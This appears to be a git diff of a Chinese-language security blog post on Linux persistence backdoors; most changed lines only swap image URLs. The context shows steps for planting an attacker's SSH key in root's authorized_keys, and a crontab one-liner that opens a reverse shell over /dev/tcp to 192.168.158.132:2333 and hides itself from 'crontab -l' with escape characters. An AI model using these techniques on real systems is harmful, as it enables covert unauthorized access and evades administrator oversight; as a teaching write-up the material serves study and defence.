@@ -4,7 +4,7 @@ date: 2022-4-2 23:36:35
 tags: [Backdoor,Linux,Kali]
 categories: 
  - [CyberSecurity,后门]
-cover: https://res.cloudinary.com/sycamore/image/upload/v1682441841/Typera/2023/04/7e00f34b8462535fcbd72b5a18b714e9.png
+cover: https://res.cloudinary.com/sycamore/image/upload/v1792085354/Typora/2023/04/7e00f34b8462535fcbd72b5a18b714e9.png
 ---
 
 :::primary
@@ -24,10 +24,10 @@ cover: https://res.cloudinary.com/sycamore/image/upload/v1682441841/Typera/2023/
 然后**攻击者**就可以利用对应的**私钥**免密登录。
 
 **实现：**
-1. 使用 **Xshell** 的 工具 -> 新建用户密钥生成向导，完成**ssh公钥、私钥**的生成：![image-20230426010853712](https://res.cloudinary.com/sycamore/image/upload/v1682442537/Typera/2023/04/0c7400e842c42ccbcd324c9147cf6c24.png)
+1. 使用 **Xshell** 的 工具 -> 新建用户密钥生成向导，完成**ssh公钥、私钥**的生成：![image-20230426010853712](https://res.cloudinary.com/sycamore/image/upload/v1792085337/Typora/2023/04/0c7400e842c42ccbcd324c9147cf6c24.png)
 （填入密码)
 <br>
-2. 保存生成的公钥文件（id_rsa_2048.pub），传到**目标服务器**上，![image-20230426010925673](https://res.cloudinary.com/sycamore/image/upload/v1682442569/Typera/2023/04/8a2edc41bc3463490d0617bcbbd9acd1.png)
+2. 保存生成的公钥文件（id_rsa_2048.pub），传到**目标服务器**上，![image-20230426010925673](https://res.cloudinary.com/sycamore/image/upload/v1792085337/Typora/2023/04/8a2edc41bc3463490d0617bcbbd9acd1.png)
 <br>
 3. 寻找 **authorized_keys** 文件，命令`find -name authorized_keys`，
 如果没有，就通过命令`touch /root/.ssh/authorized_keys`创建。
@@ -42,7 +42,7 @@ cover: https://res.cloudinary.com/sycamore/image/upload/v1682441841/Typera/2023/
 
 
 
-7. 攻击者使用**Xshell**生成的**私钥**和之前填写的**密码**，登录目标服务器![image-20230426010955314](https://res.cloudinary.com/sycamore/image/upload/v1682442599/Typera/2023/04/f0b36186750c7e6ae6e0cfb6e31536aa.png)![image-20230426011015095](https://res.cloudinary.com/sycamore/image/upload/v1682442619/Typera/2023/04/3707348bcf16ceccd18bb0594ff0933d.png)
+7. 攻击者使用**Xshell**生成的**私钥**和之前填写的**密码**，登录目标服务器![image-20230426010955314](https://res.cloudinary.com/sycamore/image/upload/v1792085333/Typora/2023/04/f0b36186750c7e6ae6e0cfb6e31536aa.png)![image-20230426011015095](https://res.cloudinary.com/sycamore/image/upload/v1792085334/Typora/2023/04/3707348bcf16ceccd18bb0594ff0933d.png)
 
 ## crontab后门
 
@@ -63,8 +63,8 @@ crontab是用来定期执行程序的命令，
 
 **隐藏：**
 但是这样的一个后门，管理员直接执行`crontab -l`就能看到我们设定的定时任务。
-![image-20230426011055514](https://res.cloudinary.com/sycamore/image/upload/v1682442659/Typera/2023/04/e8f07ae16e6573488c17eeea6f3339f2.png)
+![image-20230426011055514](https://res.cloudinary.com/sycamore/image/upload/v1792085327/Typora/2023/04/e8f07ae16e6573488c17eeea6f3339f2.png)
 这个命令其实是在读取 `/var/spool/cron/crontabs/root`文件。
 所以，我们可以利用cat的一个缺陷，使用一些**转义字符**，比如 \r 回车符 \n 换行符 \f 换页符，来**隐藏**我们不想让管理员看到的命令：
 `(crontab -l;printf "*/60 * * * * exec 9<> /dev/tcp/192.168.158.132/2333;exec 0<&9;exec 1>&9 2>&1;/bin/bash --noprofile -i;\rno crontab for `whoami`%100c\n")|crontab -`
-![image-20230426011110789](https://res.cloudinary.com/sycamore/image/upload/v1682442674/Typera/2023/04/0af7f80743588f2bae6b80f3903e55c6.png)但是，若是使用`cat -A /var/spool/cron/crontabs/root`还是可以看到我们隐藏的东西的。
+![image-20230426011110789](https://res.cloudinary.com/sycamore/image/upload/v1792085333/Typora/2023/04/0af7f80743588f2bae6b80f3903e55c6.png)但是，若是使用`cat -A /var/spool/cron/crontabs/root`还是可以看到我们隐藏的东西的。
